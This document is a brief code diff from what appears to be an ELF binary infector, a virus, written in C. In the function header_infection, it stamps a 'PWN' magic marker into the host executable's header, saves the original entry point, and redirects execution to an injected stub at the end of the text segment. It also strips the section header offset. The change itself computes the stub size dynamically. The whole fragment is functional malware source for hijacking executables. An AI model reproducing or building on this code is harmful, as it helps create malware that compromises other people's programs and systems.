@@ -15,10 +15,12 @@ void header_infection(struct s_host *host, struct s_keychain *keychain, enum e_c
 	if (context == FAILURE)
 		goto label;
 
+	const size_t stub_size = (void *)__exit - (void *)L1;
+
 	*(unsigned int *)&host->header->e_ident[EI_PAD] = PWN_MAGIC_NUMBER;
 
 	host->entry[OLD] = host->header->e_entry;
-	host->header->e_entry = (host->segment[TEXT]->p_vaddr + host->segment[TEXT]->p_memsz) - STUB_SIZE;
+	host->header->e_entry = (host->segment[TEXT]->p_vaddr + host->segment[TEXT]->p_memsz) - stub_size;
 	host->entry[NEW] = host->header->e_entry;
 
 	host->header->e_shoff = 0;
